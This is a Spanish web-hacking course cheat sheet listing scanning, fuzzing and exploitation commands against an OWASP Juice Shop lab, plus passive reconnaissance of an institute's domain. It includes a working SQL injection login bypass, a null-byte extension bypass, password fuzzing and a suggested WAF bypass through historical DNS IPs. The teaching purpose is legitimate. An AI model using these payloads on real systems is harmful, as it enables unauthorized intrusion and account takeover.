# Clase 2 — Todos los comandos (Juice Shop + educacionit.com)

Hoja de referencia consolidada para tener a mano durante la clase. Targets:
- **Juice Shop**: `juice.labs.manuel-roldan.cloud` (lab propio, autorizado)
- **educacionit.com**: dominio del instituto, usado solo para reconocimiento pasivo (whois, DNS, DNS history) — no para enumeración activa ni explotación.

---

## 1. Nmap — Juice Shop

```bash
# Scan básico de puertos web con detección de versión
nmap -sV -p 80,443 juice.labs.manuel-roldan.cloud

# Con scripts default (-sC)
nmap -sV -sC -p 80,443 juice.labs.manuel-roldan.cloud

# Scripts de vulnerabilidades/enumeración HTTP
nmap -sV --script=http-enum,http-headers,http-methods -p 443 juice.labs.manuel-roldan.cloud

# Scripts por categoría (discovery, vuln, safe)
nmap --script="discovery and safe" -p 443 juice.labs.manuel-roldan.cloud

# Script personalizado (NSE local del curso)
nmap -Pn -p 443 --script Modulo-1/lab/nmap/scripts/http-security-headers-simple.nse juice.labs.manuel-roldan.cloud

# Headers HTTP, métodos permitidos, certificado SSL (parte de la tarea)
nmap --script=http-headers -p 443 juice.labs.manuel-roldan.cloud
nmap --script=http-methods -p 443 juice.labs.manuel-roldan.cloud
nmap --script=ssl-cert,ssl-enum-ciphers -p 443 juice.labs.manuel-roldan.cloud
```

Ubicación de scripts NSE en este Mac (Homebrew, no Kali): `/opt/homebrew/share/nmap/scripts/`
Script propio del curso: `Modulo-1/lab/nmap/scripts/http-security-headers-simple.nse`

---

## 2. Gobuster — Juice Shop

```bash
# Básico
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k

# Más hilos
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 50

# Excluir códigos de error
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -b 500,501,502,503,504

# Solo ciertos status codes
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s 200,301,302,403

# El truco clave: filtrar por tamaño de respuesta (Juice Shop es SPA, todo da 200)
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k \
  --exclude-length <tamaño_del_body_generico>
```

Nota: en este Mac las wordlists de seclists están clonadas en `~/repos/personal/Curso_web_hacking/SecLists/` (no versionado, 2.5GB) — ajustar el path de `-w` según corresponda.

---

## 3. Burp Suite — Juice Shop

Setup (una vez por sesión):
```
Burp Suite → Proxy → Options → Proxy Listeners → 127.0.0.1:8080
Browser (o FoxyProxy) → usar proxy 127.0.0.1:8080
Browser → visitar http://burp → descargar e importar certificado CA
```

Intercept (login real):
```
Proxy → Intercept → Intercept is on
Login en Juice Shop desde el browser
Ver el request pausado: POST /rest/user/login con email+password en JSON plano
Forward → aparece en Proxy → HTTP history
```

Repeater (reproduce el Null Byte sin reescribir curl):
```
HTTP history → click derecho sobre GET /ftp/package.json.bak → Send to Repeater
Repeater → editar la URL: /ftp/package.json.bak%2500.md
Send → comparar status/response contra el original (403 vs 200)
```

---

## 4. Nikto — Juice Shop

```bash
# Básico
nikto -h https://juice.labs.manuel-roldan.cloud

# Sin interacción
nikto -h https://juice.labs.manuel-roldan.cloud -nointeractive

# Actualizar base de datos
sudo nikto -update
```

---

## 5. Nuclei — Juice Shop

```bash
# Completo
nuclei -u https://juice.labs.manuel-roldan.cloud

# Solo alta/crítica
nuclei -u https://juice.labs.manuel-roldan.cloud -s high,critical

# Guardar resultados
nuclei -u https://juice.labs.manuel-roldan.cloud -o juice-results.txt
```

---

## 6. Searchsploit — por tecnología detectada

```bash
searchsploit node-serialize
searchsploit Express
searchsploit Traefik

# Ver contenido de un exploit
searchsploit -x nodejs/webapps/49552.py
```

---

## 7. Curl — Juice Shop

```bash
# Headers de respuesta
curl -sI https://juice.labs.manuel-roldan.cloud

# Information disclosure (stack trace completo)
curl -s https://juice.labs.manuel-roldan.cloud/api/version

# Extraer rutas de la API desde el JS del frontend
# (el build actual usa template literals con backticks, no comillas dobles)
curl -s https://juice.labs.manuel-roldan.cloud/main.js \
  | grep -oE '[`"]/(api|rest)/[^`"]+[`"]' | tr -d '`"' | sort -u

# Null Byte Injection — bypass de extensión
curl -s "https://juice.labs.manuel-roldan.cloud/ftp/package.json.bak%2500.md"

# SQLi en login (bypass de autenticación)
curl -X POST https://juice.labs.manuel-roldan.cloud/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}'
```

---

## 8. Fuzzing — Gobuster vs dirsearch vs wfuzz (referencia rápida)

Ver detalle completo en `comandos_fuzzing_comparativa.md`. Resumen de lo más útil:

```bash
# Extensiones
gobuster dir -u https://target.com -w wordlist.txt -x php,bak,txt,config
dirsearch -u https://target.com -e php,bak,txt,config
wfuzz -c -w wordlist.txt -z list,php-bak-txt-config --hc 404 https://target.com/FUZZ.FUZ2Z

# Fuzzing de parámetros GET
gobuster fuzz -u "https://target.com/search?q=FUZZ" -w wordlist.txt -mc 200
wfuzz -c -w wordlist.txt --hc 404 "https://target.com/search?q=FUZZ"

# Fuzzing de body POST
gobuster fuzz -u https://target.com/login -m POST -b "user=admin&pass=FUZZ" -w passwords.txt -mc 200
wfuzz -c -w passwords.txt -d "user=admin&pass=FUZZ" --hc 403 https://target.com/login
```

---

## 9. Reconocimiento pasivo — educacionit.com

**Solo pasivo**: whois, DNS, DNS history. Sin enumeración activa ni explotación contra este dominio.

```bash
# WHOIS del dominio
whois educacionit.com

# Registros DNS actuales
dig educacionit.com A
dig educacionit.com AAAA
dig educacionit.com MX
dig educacionit.com TXT
dig educacionit.com NS

# Fingerprinting de tecnología (igual que Clase 1)
whatweb https://educacionit.com

# Headers de respuesta
curl -sI https://educacionit.com
```

### DNS history — revelar IP real detrás de un WAF/CDN

```bash
# CompleteDNS API (requiere API key habilitada en el plan — la que probamos dio 401)
curl -s "https://api.completedns.com/v2/dns-history/educacionit.com?key=TU_API_KEY" | python3 -m json.tool
```

Nota de la clase anterior: la key probada devolvió `401 api_key_not_valid` — la cuenta no tiene el add-on de API habilitado, o la key no es la correcta. Confirmar en el dashboard de CompleteDNS antes de usarla en vivo. Alternativa sin key (trial gratis): **ViewDNS.info** tiene un endpoint de IP History similar.

```bash
# Alternativa — ViewDNS.info (trial gratis)
curl -s "https://api.viewdns.info/iphistory/?domain=educacionit.com&apikey=TU_API_KEY&output=json"
```

**Idea pedagógica**: si `educacionit.com` está detrás de un CDN/WAF hoy, el historial de DNS puede revelar una IP anterior (antes de migrar al CDN) que todavía sirve la app real sin protección — permitiendo bypass del WAF conectando directo a esa IP con `curl --resolve` o editando `/etc/hosts` temporalmente. Confirmar primero si el dominio está realmente detrás de un CDN (`dig` + `whatweb`) antes de armar la demo.

---

## Notas generales

- Todos los comandos activos (Gobuster, Nikto, Nuclei, SQLi, Null Byte) son **solo contra Juice Shop** (lab propio, autorizado).
- Contra `educacionit.com`: únicamente los comandos de la sección 9 (pasivo). No correr Gobuster/Nikto/Nuclei/SQLi contra ese dominio sin autorización explícita del instituto.
- `-k` en curl/gobuster ignora errores de certificado SSL.
- Nmap no acepta URLs con `https://`, solo hostname o IP.
